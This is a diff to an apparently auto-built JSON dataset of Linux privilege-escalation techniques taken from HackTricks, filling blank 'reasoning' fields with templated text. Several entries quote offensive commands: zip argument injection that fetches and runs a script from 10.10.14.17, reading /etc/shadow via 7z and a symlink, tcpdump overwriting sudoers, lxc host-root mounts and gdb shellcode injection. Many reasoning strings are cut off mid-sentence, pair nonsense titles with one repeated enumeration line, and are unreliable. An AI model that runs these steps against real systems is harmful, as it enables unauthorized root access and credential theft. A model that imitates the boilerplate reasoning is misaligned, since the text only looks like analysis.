+  "reasoning": "Privilege escalation technique: Parameter Injection via Deep Links. Target OS: linux. Has 1 associated commands. In the [ CVE-2021-38112 ](https://rhinosecuritylabs. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/electron-cef-chromium-debugger-abuse"
  },
  {
@@ -5244,7 +5244,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Post-Exploitation. Target OS: linux. Has 1 associated commands. In a real environment and  after compromising  a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the  debugging activated and port-forward the debugging port  so Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/electron-cef-chromium-debugger-abuse"
  },
  {
@@ -5317,7 +5317,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enumeration. Target OS: linux. Has 5 associated commands. Get info about the jail: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5341,7 +5341,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Modify PATH. Target OS: linux. Has 3 associated commands. Check if you can modify the PATH env variable Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5360,7 +5360,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Using vim. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5379,7 +5379,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Create script. Target OS: linux. Has 2 associated commands. Check if you can create an executable file with _/bin/bash_ as content Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5403,7 +5403,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Get bash from SSH. Target OS: linux. Has 3 associated commands. If you are accessing via ssh you can use this trick to execute a bash shell: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5422,7 +5422,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Declare. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5436,7 +5436,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Wget. Target OS: linux. Has 1 associated commands. You can overwrite for example sudoers file Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5480,7 +5480,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Lua Jails. Target OS: linux. Has 7 associated commands. In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/escaping-from-limited-bash"
  },
  {
@@ -5509,7 +5509,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Case 1: Using `setuid` with `system`. Target OS: linux. Has 4 associated commands. Objective : Understanding the effect of  setuid  in combination with  system  and  bash  as  sh . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/euid-ruid-suid"
  },
  {
@@ -5528,7 +5528,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Case 2: Using setreuid with system. Target OS: linux. Has 2 associated commands. C Code : Compilation and Permissions: Execution and Result: Analysis: -  setreuid  sets both ruid and euid to 1000. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/euid-ruid-suid"
  },
  {
@@ -5637,7 +5637,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Case 3: Using setuid with execve. Target OS: linux. Has 20 associated commands. Objective: Exploring the interaction between setuid and execve. Execution and Result: Analysis: -  ruid  remains 99, but euid is set to 1000, in line with setuid's effect. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/euid-ruid-suid"
  },
  {
@@ -5656,7 +5656,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Allow members of group admin to execute any command. Target OS: linux. Has 2 associated commands. %admin \tALL=(ALL:ALL) ALL sudo su Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5724,7 +5724,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Wheel Group. Target OS: linux. Has 2 associated commands. Sometimes ,  by default  inside the  /etc/sudoers  file you can find this line: This means that  any user that belongs to the group wheel can execute anything as sudo . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5738,7 +5738,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Shadow Group. Target OS: linux. Has 1 associated commands. Users from the  group shadow  can  read  the  /etc/shadow  file: So, read the file and try to  crack some hashes . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5816,7 +5816,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Disk Group. Target OS: linux. Has 8 associated commands. This privilege is almost  equivalent to root access  as you can access all the data inside of the machine. Files: /dev/sd[a-z][1-9] Note that using debugfs you can also  write files . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5850,7 +5850,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Video Group. Target OS: linux. Has 5 associated commands. Using the command  w  you can find  who is logged on the system  and it will show an output like the following one: The  tty1  means that the user  yossi is logged physically  to a terminal on the mac Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5864,7 +5864,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Root Group. Target OS: linux. Has 1 associated commands. It looks like by default  members of root group  could have access to  modify  some  service  configuration files or some  libraries  files or  other interesting things  that could be used to escalate Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5893,7 +5893,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker Group. Target OS: linux. Has 4 associated commands. You can  mount the root filesystem of the host machine to an instance’s volume , so when the instance starts it immediately loads a  chroot  into that volume. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -5907,7 +5907,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Create the container - Beware of architecture while compiling locally.. Target OS: linux. Has 1 associated commands. sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64 bash lxc image import lxd.tar.xz rootfs. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/lxd-privilege-escalation"
  },
  {
@@ -5936,7 +5936,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: List containers. Target OS: linux. Has 4 associated commands. lxc list lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true bash lxc start privesc lxc exec privesc /bin/sh [email protected]:~  cd /mnt/root  Here is where the filesy Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/lxd-privilege-escalation"
  },
  {
@@ -5965,7 +5965,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Prepare the environment. Target OS: linux. Has 4 associated commands. In the following section you can find the code of the files we are going to use to prepare the environment {{ tabs}} {{ tab name=\"sharedvuln.c\"}} {{ endtab}} {{ tab name=\"libcustom. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ld.so.conf-example"
  },
  {
@@ -6014,7 +6014,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check the environment. Target OS: linux. Has 8 associated commands. Check that _libcustom.so_ is being  loaded  from _/usr/lib_ and that you can  execute  the binary. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ld.so.conf-example"
  },
  {
@@ -6043,7 +6043,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Exploit. Target OS: linux. Has 4 associated commands. In this scenario we are going to suppose that  someone has created a vulnerable entry  inside a file in _/etc/ld.so.conf/_: The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ld.so.conf-example"
  },
  {
@@ -6097,7 +6097,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Exploit 2. Target OS: linux. Has 9 associated commands. Suppose you have sudo privileges over  ldconfig .\\ You can indicate  ldconfig   where to load the conf files from , so we can take advantage of it to make  ldconfig  load arbitrary folders. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ld.so.conf-example"
  },
  {
@@ -6126,7 +6126,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CCACHE ticket reuse from keyring. Target OS: linux. Has 4 associated commands. Kerberos tickets stored in a process's memory can be extracted , particularly when the machine's ptrace protection is disabled ( /proc/sys/kernel/yama/ptrace_scope ). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-active-directory"
  },
  {
@@ -6145,7 +6145,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CCACHE ticket reuse from SSSD KCM. Target OS: linux. Has 2 associated commands. SSSD maintains a copy of the database at the path  /var/lib/sss/secrets/secrets.ldb . The corresponding key is stored as a hidden file at the path  /var/lib/sss/secrets/.secrets.mkey . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-active-directory"
  },
  {
@@ -6169,7 +6169,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CCACHE ticket reuse from keytab. Target OS: linux. Has 3 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-active-directory"
  },
  {
@@ -6183,7 +6183,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Output includes service principal details and the NT Hash. Target OS: linux. Has 1 associated commands. bash python3 keytabextract.py krb5. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-active-directory"
  },
  {
@@ -6202,7 +6202,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Expected output varies based on hash availability. Target OS: linux. Has 2 associated commands. bash ./bifrost -action dump -source keytab -path /path/to/your/file bash crackmapexec 10.XXX.XXX. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-active-directory"
  },
  {
@@ -6311,7 +6311,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Processes Capabilities. Target OS: linux. Has 20 associated commands. To see the capabilities for a particular process, use the  status  file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6335,7 +6335,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Binaries Capabilities. Target OS: linux. Has 3 associated commands. Binaries can have capabilities that can be used while executing. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6363,7 +6363,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Remove Capabilities. Target OS: linux. Has 1 associated commands. You can remove capabilities of a binary with Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6402,7 +6402,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Environment Capabilities. Target OS: linux. Has 6 associated commands. Compiling the following program it's possible to  spawn a bash shell inside an environment that provides capabilities . c:ambient. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6450,7 +6450,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Privesc/Container Escape. Target OS: linux. Has 4 associated commands. Capabilities are useful when you  want to restrict your own processes after performing privileged operations  (e.g. after setting up chroot and binding to a socket). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6489,7 +6489,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Exploitation example. Target OS: linux. Has 6 associated commands. In the following example the binary  /usr/bin/python2. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6617,7 +6617,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_SYS_PTRACE. Target OS: linux. Has 2 associated commands. This means that you can escape the container by injecting a shellcode inside some process running inside the host. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6641,7 +6641,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Detach from the process.. Target OS: linux. Has 3 associated commands. libc. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6655,7 +6655,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Change endianess and print gdb lines to load the shellcode in RIP directly. Target OS: linux. Has 1 associated commands. for i in range(0, len(buf), 8): \tchunk = payload[i:i+8][::-1] \tchunks = \"0x\" \tfor byte in chunk: \t\tchunks += f\"{byte:02x}\" \tprint(f\"set {{long}}($rip+{i}) = {chunks}\") bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6699,7 +6699,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: NOTE that the process you abuse will die after the shellcode. Target OS: linux. Has 7 associated commands. /usr/bin/gdb -p $(pgrep sleep) [...] (gdb) source commands.gdb Continuing. process 207009 is executing new program: /usr/bin/dash [... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -6808,7 +6808,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_SYS_MODULE. Target OS: linux. Has 20 associated commands. [ CAP_SYS_MODULE ](https://man7.org/linux/man-pages/man7/capabilities.7. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7001,7 +7001,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_DAC_OVERRIDE. Target OS: linux. Has 16 associated commands. This mean that you can bypass write permission checks on any file, so you can write any file. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7020,7 +7020,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_CHOWN. Target OS: linux. Has 2 associated commands. This means that it's possible to change the ownership of any file. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7034,7 +7034,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_FOWNER. Target OS: linux. Has 1 associated commands. This means that it's possible to change the permission of any file. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7083,7 +7083,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_SETUID. Target OS: linux. Has 8 associated commands. This means that it's possible to set the effective user id of the created process. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7211,7 +7211,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ldd /sbin/setcap. Target OS: linux. Has 15 associated commands. libcap = ctypes.cdll.LoadLibrary(\"libcap.so.2\") libcap.cap_from_text.argtypes = [ctypes.c_char_p] libcap.cap_from_text.restype = ctypes.c_void_p libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7240,7 +7240,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_KILL. Target OS: linux. Has 4 associated commands. This means that it's possible to kill any process. Example with binary Lets suppose the  python  binary has this capability. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7309,7 +7309,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_NET_BIND_SERVICE. Target OS: linux. Has 12 associated commands. This means that it's possible to listen in any port (even in privileged ones).  You cannot escalate privileges directly with this capability. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7418,7 +7418,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_NET_RAW. Target OS: linux. Has 20 associated commands. [ CAP_NET_RAW ](https://man7.org/linux/man-pages/man7/capabilities.7. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7457,7 +7457,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_NET_ADMIN + CAP_NET_RAW. Target OS: linux. Has 6 associated commands. [ CAP_NET_ADMIN ](https://man7.org/linux/man-pages/man7/capabilities.7. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7526,7 +7526,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: CAP_LINUX_IMMUTABLE. Target OS: linux. Has 12 associated commands. This means that it's possible modify inode attributes.  You cannot escalate privileges directly with this capability. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7540,7 +7540,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Switch to the newly created user. Target OS: linux. Has 1 associated commands. su standarduser bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/linux-capabilities"
  },
  {
@@ -7609,7 +7609,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: POSIX CPU Timers TOCTOU race (CVE-2025-38352). Target OS: linux. Has 12 associated commands. {{ include ../../../banners/hacktricks-training. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/posix-cpu-timers-toctou-cve-2025-38352"
  },
  {
@@ -7895,7 +7895,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Remote Exploit. Target OS: linux. Has 15 associated commands. Option 1 using bash: -  Mounting that directory  in a client machine, and  as root copying  inside the mounted folder the  /bin/bash  binary and giving it  SUID  rights, and  executing from the victim Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/nfs-no_root_squash-misconfiguration-pe"
  },
  {
@@ -7924,7 +7924,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Compiling the Library. Target OS: linux. Has 4 associated commands. The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/nfs-no_root_squash-misconfiguration-pe"
  },
  {
@@ -7973,7 +7973,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Conducting the Exploit. Target OS: linux. Has 8 associated commands. The exploit involves creating a simple C program ( pwn.c ) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary ( a. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/nfs-no_root_squash-misconfiguration-pe"
  },
  {
@@ -7987,7 +7987,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: script from https://www.errno.fr/nfs_privesc.html. Target OS: linux. Has 1 associated commands. import sys import os def get_file_uid(filepath):     try:         uid = os.stat(filepath).st_uid     except OSError as e:         return get_file_uid(os.path. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/nfs-no_root_squash-misconfiguration-pe"
  },
  {
@@ -8006,7 +8006,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Bash. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8045,7 +8045,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: C. Target OS: linux. Has 6 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8124,7 +8124,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Overwriting a library. Target OS: linux. Has 14 associated commands. Check a library used by some binary, in this case  /bin/su : In this case lets try to impersonate  /lib/x86_64-linux-gnu/libaudit.so.1 . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8138,7 +8138,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **www-data to sudoers**. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8152,7 +8152,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Change root password**. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8166,7 +8166,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Add new root user to /etc/passwd. Target OS: linux. Has 1 associated commands. {{ include ../../banners/hacktricks-training. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/payloads-to-execute"
  },
  {
@@ -8219,7 +8219,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Socket binding example with Python. Target OS: linux. Has 2 associated commands. In the following example a  unix socket is created  ( /tmp/socket_test.s ) and everything  received  is going to be  executed  by  os.system . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/socket-command-injection"
  },
  {
@@ -8233,7 +8233,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Spawn a thread so we have a TID we can signal. Target OS: linux. Has 1 associated commands. th = threading.Thread(target=time.sleep, args=(600,)); th.start()  tid = th.native_id    Python >=3.8 s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) s.connect(\"/tmp/remotelogger\") s. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/socket-command-injection"
  },
  {
@@ -8276,7 +8276,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Summary. Target OS: linux. Has 4 associated commands. What can you do if you discover inside the  /etc/ssh_config  or inside  $HOME/. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ssh-forward-agent-exploitation"
  },
  {
@@ -8355,7 +8355,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Root cause and vulnerable pattern (open-vm-tools). Target OS: linux. Has 14 associated commands. In open-vm-tools, the serviceDiscovery plugin script get-versions. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244"
  },
  {
@@ -8389,7 +8389,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: After the next cycle, expect a root shell or your privileged action. Target OS: linux. Has 5 associated commands. bash /tmp/httpd -v >\"/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.stdout\" 2>\"/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244"
  },
  {
@@ -8403,7 +8403,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: attacker-controlled directory. Target OS: linux. Has 1 associated commands. touch \"--reference=/root/secret file\"     ← filename becomes an argument bash chown -R alice:alice  .php chmod -R 644  . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/wildcards-spare-tricks"
  },
  {
@@ -8417,7 +8417,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: directory writable by low-priv user. Target OS: linux. Has 1 associated commands. cd /path/controlled ln -s /etc/shadow   root.txt        file we want to read touch @root.txt                    tells 7z to use root.txt as file list bash 7za a /backup/ date +%F . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/wildcards-spare-tricks"
  },
  {
@@ -8451,7 +8451,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x. Target OS: linux. Has 5 associated commands. bash zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap      fails to parse zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/wildcards-spare-tricks"
  },
  {
@@ -8510,7 +8510,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root. Target OS: linux. Has 10 associated commands. Very common sudoers anti-pattern: Issues - The   glob and permissive patterns only constrain the first  -w  argument.  tcpdump  accepts multiple  -w  options; the last one wins. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/wildcards-spare-tricks"
  },
  {
@@ -8529,7 +8529,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: On victim (sudoers rule allows tcpdump as above). Target OS: linux. Has 2 associated commands. sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \\   -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \\   -F /var/cache/captures/filter. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/wildcards-spare-tricks"
  },
  {
@@ -8548,7 +8548,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Git hooks. Target OS: linux. Has 2 associated commands. [ Git hooks ](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are  scripts  that are  run  on various  events  in a git repository like when a commit is created, a merge... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/write-to-root"
  },
  {
@@ -8572,7 +8572,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Overwrite schema handlers (like http: or https:). Target OS: linux. Has 3 associated commands. An attacker with write permissions to a victim's configuration directories can easily replace or create files that change system behavior, resulting in unintended code execution. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/write-to-root"
  },
  {
@@ -8631,7 +8631,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Root executing user-writable scripts/binaries. Target OS: linux. Has 10 associated commands. If a privileged workflow runs something like  /bin/sh /home/username/... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/write-to-root"
  }
 ]
